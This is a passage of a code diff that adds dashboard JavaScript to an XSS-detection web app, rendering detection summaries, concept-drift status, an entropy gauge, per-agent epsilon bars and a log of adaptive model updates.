+        plot_bgcolor: '#fff', paper_bgcolor: '#fff'
+    };
+
+    Plotly.newPlot('diversityHeatmap', data, layout, {displayModeBar: false, responsive: true});
+
+    // Brief textual summary
+    const xssDetected = rows.filter(r => r.is_xss).length;
+    const sum = document.getElementById('diversitySummary');
+    sum.innerHTML = `Detected ${xssDetected} / ${rows.length} variants as malicious.
+        Diversity across rows demonstrates that no single agent dominates — different attack patterns
+        activate different agents.`;
+}
+
+// ════════════════════════════════════════════════════════════════════
+// Tab 4 — Adaptive Learning Dashboard
+// ════════════════════════════════════════════════════════════════════
+let _adapterTimer = null;
+
+async function refreshAdapterState() {
+    try {
+        const r = await fetch('/api/adapter-state');
+        const s = await r.json();
+        if (s.error) return;
+        renderAdapter(s);
+    } catch(e) { /* ignore */ }
+}
+
+function renderAdapter(s) {
+    const stats = s.stats || {};
+    document.getElementById('cntPseudo').textContent = stats.pseudo_labeled || 0;
+    document.getElementById('cntUncertain').textContent = stats.uncertain || 0;
+    document.getElementById('cntDrift').textContent = s.drift_counter + ' / ' + s.drift_threshold;
+    document.getElementById('cntUpdates').textContent = (s.micro_updates || []).length;
+
+    // Drift banner
+    const b = document.getElementById('driftBanner');
+    if (s.drift_counter >= Math.ceil(s.drift_threshold * 0.6)) {
+        b.className = 'drift-banner drift-alert';
+        b.innerHTML = `<i class="bi bi-exclamation-triangle me-2"></i>
+            Concept drift accumulating: ${s.drift_counter} / ${s.drift_threshold} uncertain events.
+            Micro-update will trigger at threshold.`;
+    } else {
+        b.className = 'drift-banner drift-ok';
+        b.innerHTML = `<i class="bi bi-check-circle me-2"></i>System in steady state · ${stats.total_observed || 0} events observed total.`;
+    }
+
+    // Entropy gauge from recent events
+    const recent = s.recent_events || [];
+    const avgEntropy = recent.length
+        ? recent.reduce((acc, e) => acc + (e.entropy || 0), 0) / recent.length
+        : 0;
+    Plotly.newPlot('entropyGauge', [{
+        type: 'indicator',
+        mode: 'gauge+number',
+        value: Number(avgEntropy.toFixed(3)),
+        number: { font: { size: 30 } },
+        gauge: {
+            axis: { range: [0, 1], tickfont: { size: 10 } },
+            bar: { color: avgEntropy > 0.7 ? '#dc3545' : avgEntropy > 0.4 ? '#f39c12' : '#28a745' },
+            steps: [
+                { range: [0.0, 0.4], color: '#d4edda' },
+                { range: [0.4, 0.7], color: '#fff3cd' },
+                { range: [0.7, 1.0], color: '#f8d7da' }
+            ]
+        }
+    }], {
+        margin: { t: 10, b: 10, l: 10, r: 10 },
+        height: 160, font: { family: 'Segoe UI, system-ui, sans-serif' }
+    }, {displayModeBar: false, responsive: true});
+
+    // Epsilon bars
+    const eps = s.epsilons || [];
+    const epsHtml = eps.map((e, i) => {
+        const pct = Math.min(100, e / 0.10 * 100);
+        return `<div class="epsilon-bar">
+            <span class="lbl">A${i}</span>
+            <div class="track"><div class="fill" style="width:${pct}%"></div></div>
+            <code style="width:55px;text-align:right;">${e.toFixed(3)}</code>
+        </div>`;
+    }).join('');
+    document.getElementById('epsilonBars').innerHTML = epsHtml || '<small class="text-muted">No data yet.</small>';
+
+    // Recent events
+    const re = (s.recent_events || []).slice().reverse();
+    const reHtml = re.map(ev => {
+        const badgeCls = ev.flag === 'uncertain' ? 'warning' : (ev.flag === 'consensus_xss' ? 'danger' : 'success');
+        return `<div class="mutation-row" style="padding:6px 10px; margin-bottom:4px; background:#fff;">
+            <div class="small">
+              <span class="badge bg-${badgeCls}">${ev.flag}</span>
+              <code style="font-size:.72rem">${esc(ev.text.slice(0,50))}</code>
+            </div>
+            <div class="small text-muted">votes ${ev.votes}/10 · ent ${ev.entropy} · score ${(ev.score*100).toFixed(0)}%</div>
+        </div>`;
+    }).join('');
+    document.getElementById('recentEvents').innerHTML = reHtml || '<small class="text-muted">No events yet — run any input above.</small>';
+
+    // Micro-update log
+    const mu = (s.micro_updates || []).slice().reverse();
+    const muHtml = mu.map(u => {
+        const t = new Date(u.ts * 1000).toLocaleTimeString();
+        return `<div class="micro-update-item">
+          <strong><i class="bi bi-lightning text-warning"></i> ${t}</strong> · ${u.reason}
+          <div class="small text-muted">agents [${(u.agents_updated || []).join(', ')}] → ε = [${(u.new_epsilons || []).join(', ')}]</div>
+        </div>`;
+    }).join('');
+    document.getElementById('microUpdateLog').innerHTML = muHtml || '<small class="text-muted">No micro-updates yet. Submit more uncertain inputs to trigger drift.</small>';
+}
+
+// Wire tab lifecycle: poll adapter every 2 s while Tab 4 visible, lazy-load Tab 3 on first show
+document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('button[data-bs-toggle="tab"]').forEach(btn => {
+        btn.addEventListener('shown.bs.tab', e => {
+            const target = e.target.dataset.bsTarget;
+            if (target === '#tab-adapt') {
+                refreshAdapterState();
+                if (!_adapterTimer) _adapterTimer = setInterval(refreshAdapterState, 2000);
+            } else if (_adapterTimer) {
+                clearInterval(_adapterTimer); _adapterTimer = null;
+            }
+            if (target === '#tab-diversity') runDiversity();
+        });
+    });
+    // Run an initial MAFS for Tab 1 default input on page load (after Plotly loads)
+    setTimeout(runMafs, 300);
+});
+</script>
+</body>
+</html>
